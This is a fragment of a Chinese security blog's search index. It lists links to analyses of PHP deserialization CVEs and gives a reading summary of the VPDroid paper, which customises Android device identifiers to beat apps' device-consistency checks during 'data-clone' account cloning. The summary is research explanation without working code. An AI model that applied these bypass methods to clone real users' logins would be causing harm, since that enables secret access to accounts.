href="https://xz.aliyun.com/t/15127?time__1311=GqjxuQD=omwxlxGgx+xCqiKbn7wG8U3feD">https://xz.aliyun.com/t/15127?time__1311=GqjxuQD%3DomwxlxGgx%2BxCqiKbn7wG8U3feD</a></p><h3 id="CVE-2020-15148-Yii2"><a href="#CVE-2020-15148-Yii2" class="headerlink" title="CVE-2020-15148 Yii2"></a>CVE-2020-15148 Yii2</h3><p><a href="https://www.cnblogs.com/Aurora-M/p/15659232.html">https://www.cnblogs.com/Aurora-M/p/15659232.html</a></p><h3 id="CVE-2018-18753-Typecho"><a href="#CVE-2018-18753-Typecho" class="headerlink" title="CVE-2018-18753 Typecho"></a>CVE-2018-18753 Typecho</h3><p><a href="https://www.cnblogs.com/wuhongbin/p/15526142.html">https://www.cnblogs.com/wuhongbin/p/15526142.html</a></p><h3 id="CVE-2019-6340"><a href="#CVE-2019-6340" class="headerlink" title="CVE-2019-6340"></a>CVE-2019-6340</h3><p><a href="https://blog.csdn.net/shelter1234567/article/details/135187595">https://blog.csdn.net/shelter1234567/article/details/135187595</a></p><h3 id="phpBB-Phar-CVE-2018-19274"><a href="#phpBB-Phar-CVE-2018-19274" class="headerlink" title="phpBB Phar CVE-2018-19274"></a>phpBB Phar CVE-2018-19274</h3><p><a href="https://xz.aliyun.com/t/8239">https://xz.aliyun.com/t/8239</a></p><h3 id="CVE-2022-30287-Horde-Webmail"><a href="#CVE-2022-30287-Horde-Webmail" class="headerlink" title="CVE-2022-30287 Horde Webmail"></a>CVE-2022-30287 Horde Webmail</h3><p><a href="https://www.ctfiot.com/45607.html">https://www.ctfiot.com/45607.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【论文精读】App’s Auto-Login Function Security Testing via Android OS-Level Virtualization</title>
      <link href="/2024/09/10/PaperReading/Auto-Login/"/>
      <url>/2024/09/10/PaperReading/Auto-Login/</url>
      
        <content type="html"><![CDATA[<h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>本文研究的问题是APP账号自动登录，首先刚看到题目我以为是那种手机上都会有自动输入账号密码的机制，读了文章之后了解到这里说的自动登录是登录状态的保持，比如微信，我们只需要在刚下载微信时输入账号密码进行登录，之后每次即便是关掉微信进程，也是一打开就是自动登录的，这也就省去了用户频繁输入账号和口令的麻烦。然而，在实际使用中，它易受到“data-clone attack”的威胁： 如果自动登录依赖的数据存储在本地，它可能会被攻击者克隆，导致攻击者可以突破登录设备数量限制或秘密登录受害者的帐户，从而损害APP运营者的合法权益或侵犯用户隐私和数据安全。对此，业界提出了设备一致性检查方案，只要发现APP运行设备环境发生变化，APP将禁止自动登录进而阻止克隆攻击。针对该问题，本文进一步研究发现该方案无法完全防御“data-clone attack”。该团队提出了一个具有良好透明性的虚拟化方案VPDroid， 可定制攻击所需的设备环境，以进行App自动登录的安全测试。该研究对应用市场中234个主流APP进行了测试，结果表明，通过VPDroid可有效绕过被测APP的一致性检查机制。在该成果的研究过程中，该团队发现了系列安全漏洞，近20个厂商对提交的漏洞给予了确认（其中包括1个CVE和近10项CNVD漏洞成果）。</p><p>具体什么是自动登录呢，如下图是我在作者的另一篇论文中找到的图片，可以看到当前已有设备登录账号，在另一手机登陆时会弹出仅能登录一个设备的提示。在安卓手机中，app通常使用用户登录凭证来实现自动登录，在首次登录成功之后，app将凭证数据保存在本地存储当中，下次登陆前进行验证，安卓提供了四种存储机制包括内部存储、外部存储、共享存储、数据库存储。相应的app数据会存储在对应路径当中，一般其它的应用是无法访问的。要实现克隆的话不仅需要克隆应用本身资源，为了防止这样的克隆行为，业界的解决方案是检查设备一致性，如设备电话号、序列号等信息，此类行为可能可以使用Xposed等框架hook相关函数进行绕过，但很多app也会有反调试措施，而且之前的相关工作当中仅hook了13个相关的标识信息，但本文通过调研发现了103个有关设备标识的信息。</p><p>本文通过定制了一个安卓虚拟机系统来实现了对设备标识的定制化修改，该修改对于app来说是透明的。Cells是一个轻量的安卓虚拟机系统，可以直接与硬件进行交互，他的主要机制是创建了一个独立的虚拟机命名空间，以此实现同真机系统的隔离，以及不同系统间的隔离，但是Cells也有很多局限性，它的灵活性弱，对新版本的安卓系统并不支持，同时缺少对蓝牙、GPS等设备的支持，而且对于app来说，可以发现Cells虚拟机的指纹信息，也就是说可以发现当前设备是虚拟机。</p><p>本文在Cells的基础上进行定制化，为了实现对app克隆的攻击模型，虚拟机需要满足两个条件，第一点是需要直接能够接触到硬件，第二点是可以定制化系统参数并且对app而言该操作是透明的。为了实现这些目标，本文主要采取两个方式，首先是针对在安卓ServiceManager中定义的服务，采用binder机制进行通信，binder机制是安卓系统引入的进程间通信的一种机制。第二种方法是，对于没有在ServiceManager中定义的服务，采用和真机交互的方式，设置通信代理。（RIL是一种和电话运营商网络交互的功能接口，RILD是在C++层的接口）</p><p>VPDroid系统整体概况图如图所示，虚拟出的安卓设备独立于主机，并可实现其中的参数定制。</p><p>那么怎么具体实现参数定制化呢，VPDroid提供了一个定制文件，修改其中的文件信息便可实现定制，对于安卓系统的参数信息，只需要将其中定制信息初始化在虚拟机内存中即可，对于用户层和内核层的定制化，则需要将其初始化在真机内存中。</p><p>本文采用了应用商店排名靠前的234个应用进行实验，在VPDroid中所有app都能实现绕过，作者也提出了建议，不要将认证凭证保存在本地、或者采用可信执行环境，但这样的开销也会加大，影响用户体验，本文最后也指出了VPDroid对于经root的用户来说还不是透明的，因为在采用代理通信时，VPDroid并未直接与RILD通信，也存在有相应的指纹信息。</p><h1 id="Professional-term"><a href="#Professional-term" class="headerlink" title="Professional term"></a>Professional term</h1><ul><li>original equipment manufacturer (OEM)（原始设备生产商）：</li><li>app克隆：深入挖掘APP克隆实验 - FreeBuf网络安全行业门户 Android 手机克隆&#x2F;一键换机原理初探_IT先森的博客-CSDN博客_手机克隆原理</li><li>Binder：安卓中进程间通信的一种机制 SourceAnalysis-1&#x2F;Binder源码分析.md at master · VPDroid&#x2F;SourceAnalysis-1 (github.com)</li><li>SELinux：SELinux 属于MAC的具体实现，增强了Linux系统的安全性。MAC机制的特点在于，资源的拥有者，并不能决定谁可以接入到资源。具体决定是否可以接入到资源，是基于安全策略。而安全策略则是有一系列的接入规则组成，并仅有特定权限的用户有权限操作安全策略</li><li>Android RIL概述：和电话运营商网络交互的功能接口Android RIL概述-CSDN博客</li></ul><h1 id="Thesaurus"><a href="#Thesaurus" class="headerlink" title="Thesaurus"></a>Thesaurus</h1><ul><li>client-side tampering vulnerabilities（客户端篡改漏洞）：In this paper, we focus on the security risk caused by mobile apps’ auto-login functions, which belongs to client-side tampering vulnerabilities.</li><li>hassle（麻烦）：It avoids the hassle of retyping user ID and password in a small keyboard when reaccessing the app.</li><li>In a nutshell（简而言之）：In a nutshell, we make the following three significant contributions.</li><li>backends（后端）：They exploit an entire class of apps that only rely on device-public information to authenticate the user to their backends.</li><li>seamlessly（无缝地）：For example, Smart Switch can seamlessly transfer app private data and home layouts between Galaxy devices, and it is similar for other OEM-made clone apps.</li><li>jeopardy（危险）：As a result, the user’s sensitive data will be in jeopardy without raising suspicion.</li><li>citation（引文）：The citation [19] provides more details to advocate the subscription-based app economy. For the smart home apps, we also purchase related smart home devices, including one smart lock, two security - cameras, and one smart light bulb, to test whether we can control them after launching a data-clone attack.</li><li>imperceptible（察觉不到的）：User-mode apps in the VP are imperceptible to the change of device; this requires our virtualization and device-attribute customization functions are invisible to user-mode apps running in - the VP.</li><li>proprietary（特有的，专有的）：some hardware vendors provide proprietary software</li><li>pseudo（假的）：The Binder driver is a custom pseudo driver with no corresponding physical device.</li><li>To the best of our knowledge（据我们所知）：To the best of our knowledge, VPDroid offers the most comprehensive Android device-attribute editing options so far.</li></ul><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>GitHub - VPDroid&#x2F;Dev: VPDroid is a lightweight Android OS-level virtualization architecture</p><p>​</p>]]></content>
      
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
